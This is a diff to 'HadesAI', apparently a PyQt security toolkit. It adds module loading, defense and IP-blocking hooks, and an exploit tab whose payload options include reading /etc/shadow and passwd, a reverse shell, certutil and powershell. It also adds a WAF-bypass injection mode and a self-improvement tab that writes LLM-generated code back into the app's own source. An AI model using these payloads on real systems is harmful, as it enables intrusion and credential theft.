+            self.web_knowledge_status.setText("⚠ No amp threads folder found or no JSON files detected.")
+            self.web_knowledge_status.setStyleSheet("color: #ffa94d;")
+            return
+
+        if failed > 0:
+            self.web_knowledge_status.setText(
+                f"⚠ Amp sync partial: imported {imported}, skipped {skipped}, failed {failed}"
+            )
+            self.web_knowledge_status.setStyleSheet("color: #ffa94d;")
+        else:
+            self.web_knowledge_status.setText(
+                f"✅ Amp threads synced | files: {scanned} | imported: {imported} | skipped: {skipped} | messages: {messages}"
+            )
+            self.web_knowledge_status.setStyleSheet("color: #69db7c;")
+
+        self._display_recent_web_knowledge()
+
+        # Keep user flow smooth by also updating learned exploits tab if available.
+        if hasattr(self, 'learned_table'):
+            self._refresh_learned()
+
+    def _refresh_module_list(self):
+        from os import listdir
+        from os.path import isfile, join
+
+        module_path = "modules"
+        self.module_list.clear()
+        if not os.path.exists(module_path):
+            os.makedirs(module_path)
+
+        for f in listdir(module_path):
+            if f.endswith(".py") and isfile(join(module_path, f)):
+                self.module_list.addItem(f[:-3])  # strip .py
+
+    def _load_selected_module(self):
+        import importlib.util
+
+        selected = self.module_list.currentItem()
+        if not selected:
+            self.module_output.append("[!] No module selected.")
+            return
+        module_name = selected.text()
         
+        if module_name in loaded_modules:
+            self.module_output.append(f"[!] Module '{module_name}' is already loaded.")
+            return
+            
+        module_path = os.path.join("modules", f"{module_name}.py")
+
+        spec = importlib.util.spec_from_file_location(module_name, module_path)
+        module = importlib.util.module_from_spec(spec)
+        try:
+            spec.loader.exec_module(module)
+            loaded_modules[module_name] = module
+            self.exec_btn.setEnabled(True)
+            self.module_output.append(f"[+] Module '{module_name}' loaded successfully.")
+            self._refresh_loaded_modules_list()
+        except Exception as e:
+            self.module_output.append(f"[!] Failed to load '{module_name}': {e}")
+
+    def _execute_selected_module(self):
+        selected = self.loaded_modules_list.currentItem()
+        if not selected:
+            self.module_output.append("[!] No loaded module selected.")
+            return
+            
+        module_name = selected.text()
+        module = loaded_modules.get(module_name)
+        
+        if not module:
+            self.module_output.append(f"[!] Module '{module_name}' not found in loaded modules.")
+            return
+            
+        try:
+            if hasattr(module, "main"):
+                result = module.main()
+                self.module_output.append(f"[✔] Executed '{module_name}': {result}")
+            else:
+                self.module_output.append(f"[!] Module '{module_name}' has no 'main()' method.")
+        except Exception as e:
+            self.module_output.append(f"[✖] Execution of '{module_name}' failed: {e}")
+
+    def _unload_selected_module(self):
+        selected = self.loaded_modules_list.currentItem()
+        if not selected:
+            self.module_output.append("[!] No loaded module selected.")
+            return
+            
+        module_name = selected.text()
+        if module_name in loaded_modules:
+            del loaded_modules[module_name]
+            self.module_output.append(f"[-] Module '{module_name}' unloaded.")
+            self._refresh_loaded_modules_list()
+            if not loaded_modules:
+                self.exec_btn.setEnabled(False)
+        else:
+            self.module_output.append(f"[!] Module '{module_name}' not found.")
+
+    def _refresh_loaded_modules_list(self):
+        self.loaded_modules_list.clear()
+        for module_name in loaded_modules.keys():
+            self.loaded_modules_list.addItem(module_name)
+        self.exec_btn.setEnabled(len(loaded_modules) > 0)
     def _toggle_defense_mode(self, enabled: bool):
         if self.network_monitor:
             self.network_monitor.set_defense_mode(enabled)
+
+        # Active Defense can run in standalone mode without monitor scanning.
+        monitor_running = self.network_monitor and self.network_monitor.isRunning()
+        if enabled and HAS_AUTONOMOUS_DEFENSE and not self.autonomous_defense:
+            self._init_autonomous_defense(use_network_monitor=bool(monitor_running))
+        elif not enabled and self.autonomous_defense and not self.autonomous_defense_check.isChecked():
+            self.autonomous_defense.disable()
+            self.autonomous_defense = None
+            self.standalone_defense_mode = False
+
         mode = "ENABLED" if enabled else "DISABLED"
         self._add_chat_message("system", f"⚔️ Active Defense Mode {mode}")
     def _display_recent_web_knowledge(self):
+        if not hasattr(self, 'web_knowledge_display'):
+            return
+        
         recent_patterns = self.ai.kb.fetch_recent_web_patterns(limit=5)
         if recent_patterns:
-            summary = "\n\n".join(
-                f"[Set {i+1}]\n" + "\n".join(
-                    f"- {p.get('pattern_type', 'Unknown')}: {p.get('signature', '')}" for p in patterns
-                )
-                for i, patterns in enumerate(recent_patterns)
-            )
+            summary_parts = []
+            for i, patterns in enumerate(recent_patterns, 1):
+                if patterns:  # Check if patterns list is not empty
+                    pattern_lines = []
+                    for p in patterns:
+                        # Handle both old format (pattern_type/signature) and new format (type/pattern)
+                        pattern_type = p.get('pattern_type') or p.get('type', 'Unknown')
+                        signature = p.get('signature') or p.get('pattern', '')
+                        
+                        # Only add if we have actual content
+                        if signature:
+                            pattern_lines.append(f"- {pattern_type}: {signature[:80]}")
+                        else:
+                            pattern_lines.append(f"- {pattern_type}")
+                    
+                    if pattern_lines:
+                        summary_parts.append(f"[Set {i}]\n" + "\n".join(pattern_lines))
+            
+            if summary_parts:
+                summary = "\n\n".join(summary_parts)
+            else:
+                summary = "No web knowledge patterns extracted yet. Run AutoRecon or analyze URLs to populate this tab."
         else:
             summary = "No recent web-based learning data found."
 
-        self.output_display.setPlainText(f"[HadesAI :: Web Knowledge]\n\n{summary}")
+        self.web_knowledge_display.setPlainText(
+            "[HadesAI :: Web Knowledge]\n\n"
+            "Use the URL field above to ingest a website and extract patterns/exploits.\n\n"
+            f"{summary}"
+        )
     def _toggle_learning_mode(self, enabled: bool):
         if self.network_monitor:
             self.network_monitor.set_learning_mode(enabled)
@@ -3320,6 +6139,12 @@ class HadesGUI(QMainWindow):
         
         self.threat_table.scrollToBottom()
         
+        if self.autonomous_defense and self.autonomous_defense.enabled:
+            try:
+                self.autonomous_defense.process_threat(conn)
+            except Exception as e:
+                logger.warning(f"Autonomous defense threat processing failed: {e}")
+
         # Also add to chat
         self._add_chat_message("threat", f"⚠️ [{level}] {conn.get('threat_type')}: {conn.get('remote_addr')} - {details}")
         
@@ -3337,13 +6162,26 @@ class HadesGUI(QMainWindow):
             self.network_monitor.block_ip(ip)
             self.block_ip_input.clear()
             self._add_chat_message("system", f"🚫 Manually blocked IP: {ip}")
-            
+            return
+
+        if ip and self.autonomous_defense:
+            self.autonomous_defense.rate_limiter.blocked_ips.add(ip)
+            self.autonomous_defense._apply_firewall_block(ip, permanent=True)
+            self.block_ip_input.clear()
+            self._add_chat_message("system", f"🚫 Manually blocked IP (defense engine): {ip}")
+
     def _manual_unblock_ip(self):
         ip = self.block_ip_input.text().strip()
         if ip and self.network_monitor:
             self.network_monitor.unblock_ip(ip)
             self.block_ip_input.clear()
             self._add_chat_message("system", f"✅ Unblocked IP: {ip}")
+            return
+
+        if ip and self.autonomous_defense:
+            self.autonomous_defense.rate_limiter.unblock(ip)
+            self.block_ip_input.clear()
+            self._add_chat_message("system", f"✅ Unblocked IP (defense engine): {ip}")
             
     def _clear_threat_log(self):
         self.threat_table.setRowCount(0)
@@ -3695,6 +6533,7 @@ class HadesGUI(QMainWindow):
         
         self.exploit_os = QComboBox()
         self.exploit_os.addItems(['linux', 'windows'])
+        self.exploit_os.currentTextChanged.connect(self._update_exploit_payload_options)
         config_layout.addRow("Target OS:", self.exploit_os)
         
         self.exploit_type = QComboBox()
@@ -3732,7 +6571,29 @@ class HadesGUI(QMainWindow):
         self.exploit_results.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
         layout.addWidget(self.exploit_results)
         
+        self._update_exploit_payload_options(self.exploit_os.currentText())
+
         return widget
+
+    def _update_exploit_payload_options(self, os_type: str):
+        """Update payload options to match selected target OS."""
+        if not hasattr(self, 'exploit_type'):
+            return
+
+        payloads_by_os = {
+            'linux': ['whoami', 'id', 'ls', 'pwd', 'uname', 'cat_passwd', 'cat_shadow', 'ifconfig', 'netstat', 'ps', 'env', 'curl', 'reverse_shell'],
+            'windows': ['whoami', 'dir', 'ipconfig', 'net_user', 'systeminfo', 'tasklist', 'netstat', 'powershell', 'certutil']
+        }
+
+        current = self.exploit_type.currentText()
+        options = payloads_by_os.get(os_type, payloads_by_os['linux'])
+
+        self.exploit_type.blockSignals(True)
+        self.exploit_type.clear()
+        self.exploit_type.addItems(options)
+        if current in options:
+            self.exploit_type.setCurrentText(current)
+        self.exploit_type.blockSignals(False)
         
     def _create_injection_tab(self) -> QWidget:
         widget = QWidget()
@@ -3751,6 +6612,7 @@ class HadesGUI(QMainWindow):
         type_layout.addWidget(QLabel("Injection Type:"))
         self.injection_type = QComboBox()
         self.injection_type.addItems(['Header Injection', 'JSON Injection', 'WAF Bypass'])
+        self.injection_type.currentTextChanged.connect(self._update_injection_type_ui)
         type_layout.addWidget(self.injection_type)
         
         self.json_payload_type = QComboBox()
@@ -3770,7 +6632,14 @@ class HadesGUI(QMainWindow):
         self.injection_results.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
         layout.addWidget(self.injection_results)
         
+        self._update_injection_type_ui(self.injection_type.currentText())
+
         return widget
+
+    def _update_injection_type_ui(self, injection_type: str):
+        """Show JSON payload selector only when JSON injection is selected."""
+        is_json = injection_type == 'JSON Injection'
+        self.json_payload_type.setVisible(is_json)
         
     def _create_auth_bypass_tab(self) -> QWidget:
         widget = QWidget()
@@ -4027,6 +6896,1635 @@ class HadesGUI(QMainWindow):
         
         return widget
     
+    def _create_self_improvement_tab(self) -> QWidget:
+        """Self-Improvement tab - Upload code and AI will fix/amend/verify it"""
+        widget = QWidget()
+        layout = QVBoxLayout(widget)
+        layout.setContentsMargins(10, 10, 10, 10)
+        layout.setSpacing(10)
+        
+        # Info banner
+        info_label = QLabel("🔧 HADES Self-Improvement Engine - Upload code for AI analysis, fixes, and verification")
+        info_label.setStyleSheet("background: #e94560; padding: 10px; border-radius: 5px; font-size: 12px; font-weight: bold;")
+        layout.addWidget(info_label)
+        
+        # AI Provider Selection
+        provider_group = QGroupBox("🤖 AI Provider Configuration")
+        provider_layout = QVBoxLayout(provider_group)
+        
+        # Provider selector row
+        selector_layout = QHBoxLayout()
+        selector_layout.addWidget(QLabel("Provider:"))
+        self.si_provider_combo = QComboBox()
+        self.si_provider_combo.addItems(["OpenAI (GPT)", "Mistral AI", "Ollama (Local - FREE)", "Azure OpenAI (Microsoft)"])
+        self.si_provider_combo.currentIndexChanged.connect(self._si_on_provider_changed)
+        selector_layout.addWidget(self.si_provider_combo)
+        
+        # Provider status labels
+        openai_status = "✅" if HAS_OPENAI else "❌"
+        mistral_status = "✅" if HAS_MISTRAL else "❌"
+        ollama_status = "✅" if HAS_OLLAMA else "❌"
+        azure_status = "✅" if HAS_AZURE_OPENAI else "❌"
+        self.si_provider_status = QLabel(f"OpenAI:{openai_status} Mistral:{mistral_status} Ollama:{ollama_status} Azure:{azure_status}")
+        self.si_provider_status.setStyleSheet("color: #888; font-size: 10px;")
+        selector_layout.addWidget(self.si_provider_status)
+        selector_layout.addStretch()
+        provider_layout.addLayout(selector_layout)
+        
+        # Ollama model selector (only shown when Ollama is selected)
+        ollama_layout = QHBoxLayout()
+        ollama_layout.addWidget(QLabel("Ollama Model:"))
+        self.si_ollama_model = QComboBox()
+        self.si_ollama_model.addItems(["codellama", "llama3.2", "mistral", "deepseek-coder", "qwen2.5-coder", "phi3"])
+        self.si_ollama_model.setEditable(True)  # Allow custom model names
+        ollama_layout.addWidget(self.si_ollama_model)
+        
+        refresh_models_btn = QPushButton("🔄 Refresh")
+        refresh_models_btn.clicked.connect(self._si_refresh_ollama_models)
+        refresh_models_btn.setStyleSheet("background: #0f3460;")
+        ollama_layout.addWidget(refresh_models_btn)
+        
+        self.si_ollama_info = QLabel("💡 Ollama is FREE - no API key needed!")
+        self.si_ollama_info.setStyleSheet("color: #4CAF50; font-size: 10px;")
+        ollama_layout.addWidget(self.si_ollama_info)
+        ollama_layout.addStretch()
+        
+        self.si_ollama_layout_widget = QWidget()
+        self.si_ollama_layout_widget.setLayout(ollama_layout)
+        self.si_ollama_layout_widget.hide()  # Hidden by default
+        provider_layout.addWidget(self.si_ollama_layout_widget)
+        
+        # Azure OpenAI configuration (only shown when Azure is selected)
+        azure_layout = QVBoxLayout()
+        
+        azure_row1 = QHBoxLayout()
+        azure_row1.addWidget(QLabel("Azure Endpoint:"))
+        self.si_azure_endpoint = QLineEdit()
+        self.si_azure_endpoint.setPlaceholderText("https://your-resource.openai.azure.com/")
+        azure_row1.addWidget(self.si_azure_endpoint)
+        azure_layout.addLayout(azure_row1)
+        
+        azure_row2 = QHBoxLayout()
+        azure_row2.addWidget(QLabel("Deployment Name:"))
+        self.si_azure_deployment = QLineEdit()
+        self.si_azure_deployment.setPlaceholderText("your-deployment-name (e.g., gpt-35-turbo)")
+        azure_row2.addWidget(self.si_azure_deployment)
+        
+        azure_row2.addWidget(QLabel("API Version:"))
+        self.si_azure_api_version = QComboBox()
+        self.si_azure_api_version.addItems(["2024-02-15-preview", "2023-12-01-preview", "2023-05-15"])
+        self.si_azure_api_version.setEditable(True)
+        azure_row2.addWidget(self.si_azure_api_version)
+        azure_layout.addLayout(azure_row2)
+        
+        self.si_azure_info = QLabel("💡 Get these from Azure Portal > Your OpenAI Resource > Keys and Endpoint")
+        self.si_azure_info.setStyleSheet("color: #888; font-size: 10px;")
+        azure_layout.addWidget(self.si_azure_info)
+        
+        self.si_azure_layout_widget = QWidget()
+        self.si_azure_layout_widget.setLayout(azure_layout)
+        self.si_azure_layout_widget.hide()  # Hidden by default
+        provider_layout.addWidget(self.si_azure_layout_widget)
+        
+        # API Key input row
+        key_layout = QHBoxLayout()
+        key_layout.addWidget(QLabel("API Key:"))
+        self.si_api_key_input = QLineEdit()
+        self.si_api_key_input.setPlaceholderText("Enter your API key...")
+        self.si_api_key_input.setEchoMode(QLineEdit.EchoMode.Password)
+        key_layout.addWidget(self.si_api_key_input)
+        
+        show_key_btn = QPushButton("👁")
+        show_key_btn.setMaximumWidth(30)
+        show_key_btn.clicked.connect(self._si_toggle_key_visibility)
+        show_key_btn.setStyleSheet("background: #0f3460;")
+        key_layout.addWidget(show_key_btn)
+        
+        save_key_btn = QPushButton("💾 Save")
+        save_key_btn.clicked.connect(self._si_save_api_key)
+        save_key_btn.setStyleSheet("background: #4CAF50;")
+        key_layout.addWidget(save_key_btn)
+        
+        test_key_btn = QPushButton("🔌 Test")
+        test_key_btn.clicked.connect(self._si_test_api_key)
+        test_key_btn.setStyleSheet("background: #0f3460;")
+        key_layout.addWidget(test_key_btn)
+        
+        provider_layout.addLayout(key_layout)
+        layout.addWidget(provider_group)
+        
+        # Load saved keys and provider
+        self._si_load_saved_config()
+        
+        # AI Status
+        self.si_gpt_status_label = QLabel()
+        self._si_update_gpt_status()
+        layout.addWidget(self.si_gpt_status_label)
+        
+        # Main splitter
+        main_splitter = QSplitter(Qt.Orientation.Horizontal)
+        
+        # Left side - Code input
+        left_widget = QWidget()
+        left_layout = QVBoxLayout(left_widget)
+        
+        # File operations
+        file_group = QGroupBox("📂 Load HADES Source Files")
+        file_layout = QVBoxLayout(file_group)
+        
+        # Quick load buttons for HADES files
+        hades_files_layout = QHBoxLayout()
+        
+        load_main_btn = QPushButton("📄 Load HadesAI.py")
+        load_main_btn.clicked.connect(lambda: self._si_load_hades_file("HadesAI.py"))
+        load_main_btn.setStyleSheet("background: #0f3460;")
+        hades_files_layout.addWidget(load_main_btn)
+        
+        load_personality_btn = QPushButton("🧠 Load personality_core_v2.py")
+        load_personality_btn.clicked.connect(lambda: self._si_load_hades_file("modules/personality_core_v2.py"))
+        load_personality_btn.setStyleSheet("background: #0f3460;")
+        hades_files_layout.addWidget(load_personality_btn)
+
+        load_si_section_btn = QPushButton("🧬 Load Self-Improvement Section")
+        load_si_section_btn.clicked.connect(self._si_load_self_improvement_section)
+        load_si_section_btn.setStyleSheet("background: #0f3460;")
+        hades_files_layout.addWidget(load_si_section_btn)
+        
+        file_layout.addLayout(hades_files_layout)
+        
+        # Custom file path
+        custom_file_layout = QHBoxLayout()
+        self.si_file_path = QLineEdit()
+        self.si_file_path.setPlaceholderText("Or enter custom file path...")
+        custom_file_layout.addWidget(self.si_file_path)
+        
+        browse_btn = QPushButton("📁 Browse")
+        browse_btn.clicked.connect(self._si_browse_file)
+        browse_btn.setStyleSheet("background: #0f3460;")
+        custom_file_layout.addWidget(browse_btn)
+        
+        load_custom_btn = QPushButton("📥 Load")
+        load_custom_btn.clicked.connect(self._si_load_custom_file)
+        load_custom_btn.setStyleSheet("background: #0f3460;")
+        custom_file_layout.addWidget(load_custom_btn)
+        
+        file_layout.addLayout(custom_file_layout)
+        left_layout.addWidget(file_group)
+        
+        # Code editor
+        code_group = QGroupBox("💻 Code to Analyze/Fix")
+        code_layout = QVBoxLayout(code_group)
+        
+        self.si_code_editor = QPlainTextEdit()
+        self.si_code_editor.setPlaceholderText("Paste code here or load a HADES source file...\n\nThe AI will analyze this code and suggest fixes, improvements, or verify correctness.")
+        self.si_code_editor.setFont(QFont("Consolas", 10))
+        self.si_code_editor.setMinimumHeight(300)
+        PythonHighlighter(self.si_code_editor.document())
+        code_layout.addWidget(self.si_code_editor)
+        
+        # Line count label
+        self.si_line_count = QLabel("Lines: 0")
+        self.si_line_count.setStyleSheet("color: #888;")
+        self.si_code_editor.textChanged.connect(self._si_update_line_count)
+        code_layout.addWidget(self.si_line_count)
+        
+        left_layout.addWidget(code_group)
+        main_splitter.addWidget(left_widget)
+        
+        # Right side - Analysis and fixes
+        right_widget = QWidget()
+        right_layout = QVBoxLayout(right_widget)
+        right_layout.setContentsMargins(0, 0, 0, 0)
+        right_layout.setSpacing(8)
+        
+        # Action buttons
+        action_group = QGroupBox("🚀 AI Actions")
+        action_layout = QVBoxLayout(action_group)
+        
+        # Primary actions row
+        primary_actions = QHBoxLayout()
+        
+        analyze_btn = QPushButton("🔍 Analyze & Find Issues")
+        analyze_btn.clicked.connect(self._si_analyze_code)
+        analyze_btn.setStyleSheet("background: #e94560; font-size: 12px;")
+        primary_actions.addWidget(analyze_btn)
+        
+        fix_btn = QPushButton("🔧 Auto-Fix Issues")
+        fix_btn.clicked.connect(self._si_auto_fix)
+        fix_btn.setStyleSheet("background: #4CAF50; font-size: 12px;")
+        primary_actions.addWidget(fix_btn)
+        
+        verify_btn = QPushButton("✅ Verify Code")
+        verify_btn.clicked.connect(self._si_verify_code)
+        verify_btn.setStyleSheet("background: #0f3460; font-size: 12px;")
+        primary_actions.addWidget(verify_btn)
+        
+        action_layout.addLayout(primary_actions)
+        
+        # Secondary actions row
+        secondary_actions = QHBoxLayout()
+        
+        optimize_btn = QPushButton("⚡ Optimize")
+        optimize_btn.clicked.connect(lambda: self._si_apply_action("optimize for performance and efficiency"))
+        optimize_btn.setStyleSheet("background: #0f3460;")
+        secondary_actions.addWidget(optimize_btn)
+        
+        security_btn = QPushButton("🔒 Security Audit")
+        security_btn.clicked.connect(lambda: self._si_apply_action("perform security audit and fix vulnerabilities"))
+        security_btn.setStyleSheet("background: #0f3460;")
+        secondary_actions.addWidget(security_btn)
+        
+        refactor_btn = QPushButton("♻️ Refactor")
+        refactor_btn.clicked.connect(lambda: self._si_apply_action("refactor for better code quality and readability"))
+        refactor_btn.setStyleSheet("background: #0f3460;")
+        secondary_actions.addWidget(refactor_btn)
+        
+        add_tests_btn = QPushButton("🧪 Add Tests")
+        add_tests_btn.clicked.connect(lambda: self._si_apply_action("add unit tests for this code"))
+        add_tests_btn.setStyleSheet("background: #0f3460;")
+        secondary_actions.addWidget(add_tests_btn)
+        
+        action_layout.addLayout(secondary_actions)
+
+        # Self-update actions row
+        self_update_actions = QHBoxLayout()
+
+        self_update_btn = QPushButton("♻️ Self-Update Section")
+        self_update_btn.clicked.connect(self._si_self_update_section)
+        self_update_btn.setStyleSheet("background: #ff8c42;")
+        self_update_actions.addWidget(self_update_btn)
+
+        apply_self_update_btn = QPushButton("💾 Apply Section Update")
+        apply_self_update_btn.clicked.connect(self._si_apply_section_update_to_file)
+        apply_self_update_btn.setStyleSheet("background: #4CAF50;")
+        self_update_actions.addWidget(apply_self_update_btn)
+
+        action_layout.addLayout(self_update_actions)
+        
+        # Custom instruction
+        custom_layout = QHBoxLayout()
+        self.si_custom_instruction = QLineEdit()
+        self.si_custom_instruction.setPlaceholderText("Enter custom instruction (e.g., 'add logging', 'fix the bug in function X', 'improve error handling')...")
+        self.si_custom_instruction.returnPressed.connect(self._si_apply_custom_instruction)
+        custom_layout.addWidget(self.si_custom_instruction)
+        
+        apply_custom_btn = QPushButton("▶ Apply")
+        apply_custom_btn.clicked.connect(self._si_apply_custom_instruction)
+        custom_layout.addWidget(apply_custom_btn)
+        
+        action_layout.addLayout(custom_layout)
+        
+        # Results/Fixed code
+        result_group = QGroupBox("📋 AI Analysis & Fixed Code")
+        result_layout = QVBoxLayout(result_group)
+        
+        self.si_result_display = QPlainTextEdit()
+        self.si_result_display.setReadOnly(True)
+        self.si_result_display.setFont(QFont("Consolas", 10))
+        self.si_result_display.setMinimumHeight(250)
+        PythonHighlighter(self.si_result_display.document())
+        result_layout.addWidget(self.si_result_display)
+        
+        # Result actions
+        result_actions = QHBoxLayout()
+        
+        apply_fix_btn = QPushButton("📝 Apply Fix to Editor")
+        apply_fix_btn.clicked.connect(self._si_apply_to_editor)
+        apply_fix_btn.setStyleSheet("background: #4CAF50;")
+        result_actions.addWidget(apply_fix_btn)
+        
+        save_btn = QPushButton("💾 Save to File")
+        save_btn.clicked.connect(self._si_save_fixed_code)
+        save_btn.setStyleSheet("background: #0f3460;")
+        result_actions.addWidget(save_btn)
+        
+        diff_btn = QPushButton("📊 Show Diff")
+        diff_btn.clicked.connect(self._si_show_diff)
+        diff_btn.setStyleSheet("background: #0f3460;")
+        result_actions.addWidget(diff_btn)
+        
+        result_layout.addLayout(result_actions)
+        
+        # Amp-style coding chat with workdir support
+        amp_chat_group = QGroupBox("🧠 Amp-Style Coding Chat")
+        amp_chat_layout = QVBoxLayout(amp_chat_group)
+
+        workdir_layout = QHBoxLayout()
+        workdir_layout.addWidget(QLabel("Workdir:"))
+        self.si_workdir_input = QLineEdit()
+        self.si_workdir_input.setText(str(Path.cwd()))
+        self.si_workdir_input.setPlaceholderText("Working directory for file operations")
+        workdir_layout.addWidget(self.si_workdir_input)
+
+        workdir_browse_btn = QPushButton("📁")
+        workdir_browse_btn.setMaximumWidth(36)
+        workdir_browse_btn.clicked.connect(self._si_browse_workdir)
+        workdir_layout.addWidget(workdir_browse_btn)
+
+        workdir_apply_btn = QPushButton("Set")
+        workdir_apply_btn.clicked.connect(self._si_set_workdir)
+        workdir_layout.addWidget(workdir_apply_btn)
+        amp_chat_layout.addLayout(workdir_layout)
+
+        self.si_chat_display = QTextEdit()
+        self.si_chat_display.setReadOnly(True)
+        self.si_chat_display.setMinimumHeight(240)
+        self.si_chat_display.setFont(QFont("Consolas", 10))
+        self.si_chat_display.setStyleSheet("background: #0b1220; border: 1px solid #1f2a44; padding: 6px;")
+        self.si_chat_display.setPlaceholderText(
+            "Amp-style coding helper. Commands:\n"
+            "- /files\n"
+            "- /open relative/path.py\n"
+            "- /save\n"
+            "- /edit relative/path.py | your instruction"
+        )
+        amp_chat_layout.addWidget(self.si_chat_display)
+
+        chat_input_layout = QHBoxLayout()
+        self.si_chat_input = QLineEdit()
+        self.si_chat_input.setPlaceholderText("Ask AI to help, code, explain, or edit files in the workdir...")
+        self.si_chat_input.returnPressed.connect(self._si_send_amp_chat)
+        chat_input_layout.addWidget(self.si_chat_input)
+
+        send_chat_btn = QPushButton("Send")
+        send_chat_btn.clicked.connect(self._si_send_amp_chat)
+        chat_input_layout.addWidget(send_chat_btn)
+        amp_chat_layout.addLayout(chat_input_layout)
+
+        # Clean architecture: resizable panels (Chat -> Actions -> Results)
+        right_splitter = QSplitter(Qt.Orientation.Vertical)
+        right_splitter.addWidget(amp_chat_group)
+        right_splitter.addWidget(action_group)
+        right_splitter.addWidget(result_group)
+        right_splitter.setSizes([300, 260, 320])
+        right_layout.addWidget(right_splitter)
+
+        main_splitter.addWidget(right_widget)
+        main_splitter.setSizes([520, 620])
+        
+        layout.addWidget(main_splitter)
+        
+        return widget
+    
+    def _si_update_line_count(self):
+        """Update line count display"""
+        lines = self.si_code_editor.toPlainText().count('\n') + 1
+        self.si_line_count.setText(f"Lines: {lines}")
+
+    def _si_get_provider_display_name(self, provider: Optional[str] = None) -> str:
+        """Human-readable provider name for UI messages."""
+        provider = provider or self._si_get_current_provider()
+        names = {
+            "openai": "OpenAI",
+            "mistral": "Mistral AI",
+            "ollama": "Ollama",
+            "azure": "Azure OpenAI",
+        }
+        return names.get(provider, "OpenAI")
+
+    def _si_extract_code_from_response(self, text: str) -> str:
+        """Extract raw code from model output, stripping markdown if present."""
+        content = (text or "").strip()
+        if not content:
+            return ""
+
+        if "```" in content:
+            code_blocks = re.findall(r'```(?:python)?\n?(.*?)```', content, re.DOTALL)
+            if code_blocks:
+                return code_blocks[0].strip()
+        return content
+
+    def _si_result_looks_like_code(self, text: str) -> bool:
+        """Heuristic check to avoid writing status/error text as code."""
+        candidate = (text or "").strip()
+        if not candidate or candidate.startswith(("⚠️", "❌", "🔄", "📋", "✅")):
+            return False
+
+        # For section-level updates, methods are indented; wrap in a dummy class for parsing.
+        try:
+            ast.parse("class _Temp:\n" + candidate)
+            return True
+        except SyntaxError:
+            pass
+
+        tokens = ("def ", "class ", "import ", "from ", "return", "=")
+        return any(token in candidate for token in tokens)
+    
+    def _si_get_current_provider(self) -> str:
+        """Get the currently selected AI provider"""
+        if hasattr(self, 'si_provider_combo'):
+            idx = self.si_provider_combo.currentIndex()
+            if idx == 3:
+                return "azure"
+            elif idx == 2:
+                return "ollama"
+            elif idx == 1:
+                return "mistral"
+        return "openai"
+    
+    def _si_on_provider_changed(self, index: int):
+        """Handle provider selection change"""
+        # Show/hide Ollama options
+        if hasattr(self, 'si_ollama_layout_widget'):
+            self.si_ollama_layout_widget.setVisible(index == 2)
+        
+        # Show/hide Azure options
+        if hasattr(self, 'si_azure_layout_widget'):
+            self.si_azure_layout_widget.setVisible(index == 3)
+        
+        # Show/hide API key input (Ollama doesn't need it)
+        if hasattr(self, 'si_api_key_input'):
+            needs_key = index != 2  # Ollama doesn't need API key
+            self.si_api_key_input.setEnabled(needs_key)
+            if index == 2:
+                self.si_api_key_input.setPlaceholderText("Not needed for Ollama (runs locally)")
+            elif index == 3:
+                self.si_api_key_input.setPlaceholderText("Enter your Azure OpenAI API key...")
+            else:
+                self.si_api_key_input.setPlaceholderText("Enter your API key...")
+        
+        # Load the API key for the selected provider (without changing the provider selection)
+        self._si_load_key_for_provider(index)
+        self._si_update_gpt_status()
+    
+    def _si_load_key_for_provider(self, provider_index: int):
+        """Load the saved API key for a specific provider"""
+        try:
+            config_path = os.path.join(os.path.dirname(__file__), ".hades_config.json")
+            if os.path.exists(config_path):
+                with open(config_path, 'r') as f:
+                    config = json.load(f)
+                    
+                    if provider_index == 3:  # Azure
+                        key = config.get("azure_api_key", "")
+                        self.si_api_key_input.setText(key)
+                        # Load Azure-specific settings
+                        if hasattr(self, 'si_azure_endpoint'):
+                            self.si_azure_endpoint.setText(config.get("azure_endpoint", ""))
+                        if hasattr(self, 'si_azure_deployment'):
+                            self.si_azure_deployment.setText(config.get("azure_deployment", ""))
+                        if hasattr(self, 'si_azure_api_version'):
+                            version = config.get("azure_api_version", "2024-02-15-preview")
+                            idx = self.si_azure_api_version.findText(version)
+                            if idx >= 0:
+                                self.si_azure_api_version.setCurrentIndex(idx)
+                            else:
+                                self.si_azure_api_version.setCurrentText(version)
+                    elif provider_index == 2:  # Ollama
+                        self.si_api_key_input.clear()
+                    elif provider_index == 1:  # Mistral
+                        key = config.get("mistral_api_key", "")
+                        self.si_api_key_input.setText(key)
+                    else:  # OpenAI
+                        key = config.get("openai_api_key", "")
+                        self.si_api_key_input.setText(key)
+        except:
+            pass
+    
+    def _si_refresh_ollama_models(self):
+        """Refresh list of available Ollama models"""
+        if not HAS_OLLAMA:
+            self.si_result_display.setPlainText("❌ Ollama not installed. Run: pip install ollama\n\nThen install Ollama from https://ollama.ai")
+            return
+        
+        try:
+            response = ollama_lib.list()
+            model_names = []
+            
+            # Handle different response formats
+            if isinstance(response, dict):
+                models = response.get('models', [])
+                for m in models:
+                    if isinstance(m, dict):
+                        # Try different possible keys
+                        name = m.get('name') or m.get('model') or str(m)
+                        model_names.append(name.split(':')[0] if ':' in name else name)
+                    else:
+                        model_names.append(str(m))
+            elif hasattr(response, 'models'):
+                for m in response.models:
+                    name = getattr(m, 'name', None) or getattr(m, 'model', str(m))
+                    model_names.append(name.split(':')[0] if ':' in str(name) else str(name))
+            
+            # Remove duplicates
+            model_names = list(dict.fromkeys(model_names))
+            
+            if model_names:
+                self.si_ollama_model.clear()
+                self.si_ollama_model.addItems(model_names)
+                self.si_result_display.setPlainText(f"✅ Found {len(model_names)} Ollama models:\n\n" + "\n".join(model_names))
+            else:
+                self.si_result_display.setPlainText("⚠️ No models found. Install a model with:\n\nollama pull codellama\nollama pull llama3.2\nollama pull deepseek-coder")
+        except Exception as e:
+            self.si_result_display.setPlainText(f"❌ Error connecting to Ollama: {str(e)}\n\nMake sure:\n1. Ollama app is installed from https://ollama.ai\n2. Ollama is running (check system tray or run 'ollama serve')")
+    
+    def _si_toggle_key_visibility(self):
+        """Toggle API key visibility"""
+        if self.si_api_key_input.echoMode() == QLineEdit.EchoMode.Password:
+            self.si_api_key_input.setEchoMode(QLineEdit.EchoMode.Normal)
+        else:
+            self.si_api_key_input.setEchoMode(QLineEdit.EchoMode.Password)
+    
+    def _si_get_api_key(self) -> str:
+        """Get the current API key from input or environment"""
+        key = self.si_api_key_input.text().strip()
+        if not key:
+            provider = self._si_get_current_provider()
+            if provider == "mistral":
+                key = os.getenv("MISTRAL_API_KEY", "")
+            elif provider == "azure":
+                key = os.getenv("AZURE_OPENAI_API_KEY", "") or os.getenv("OPENAI_API_KEY", "")
+            elif provider == "ollama":
